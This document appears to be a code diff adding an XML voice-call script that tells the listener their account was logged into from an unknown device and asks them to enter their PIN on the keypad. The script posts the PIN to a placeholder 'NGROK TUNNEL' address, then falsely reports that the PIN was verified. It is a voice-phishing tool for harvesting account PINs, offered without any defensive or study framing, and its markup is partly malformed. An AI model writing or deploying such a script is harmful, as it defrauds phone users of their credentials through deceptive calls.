@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+     <Say voice="man"> Welcome! Your account has been logged into an unknown device. Do you approve or disapprove this device? Press 1 for approve, 2 for disapprove.</Say>
+      <grammar root="menu">
+        <rule id="menu">
+          <one-of>
+            <item>1</item>
+            <item>2</item>
+          </one-of>
+        </rule>
+      </grammar>
+      <field name="menu">
+        <prompt>Do you approve or disapprove this device? Press 1 for approve, 2 for disapprove.</prompt>
+        <filled>
+          <if cond="menu == '1'">
+            <prompt>Please enter your PIN using the keypad.</prompt>
+            <grammar root="PIN">
+              <rule id="PIN">
+                <one-of>
+                  <item> <ruleref special="digits"/> </item>
+                </one-of>
+              </rule>
+            </grammar>
+            <field name="PIN">
+              <prompt>Please enter your PIN using the keypad.</prompt>
+              <filled>
+                <submit next="NGROK TUNNEL" namelist="PIN" method="post" enctype="application/x-www-form-urlencoded" />
+              </filled>
+            </field>
+            <noinput>
+              <reprompt/>
+            </noinput>
+            <nomatch>
+              <prompt>Please enter a valid PIN using the keypad.</prompt>
+              <reprompt/>
+            </nomatch>
+          </if>
+          <if cond="menu == '2'">
+            <prompt>Thank you for letting us know. Your account will be secured.</prompt>
+            <exit/>
+          </if>
+        </filled>
+      </field>
+      <noinput>
+        <reprompt/>
+      </noinput>
+      <nomatch>
+        <prompt>Do you approve or disapprove this device? Press 1 for approve, 2 for disapprove.</prompt>
+        <reprompt/>
+      </nomatch>
+    </block>
+    <block id="verify">
+      <prompt>Your PIN has been verified. Thank you for calling.</prompt>
+      <submit next="NGROK TUNNEL FOR NEXT FILE" method="post" enctype="application/x-www-form-urlencoded" />
+      <exit/>
+    
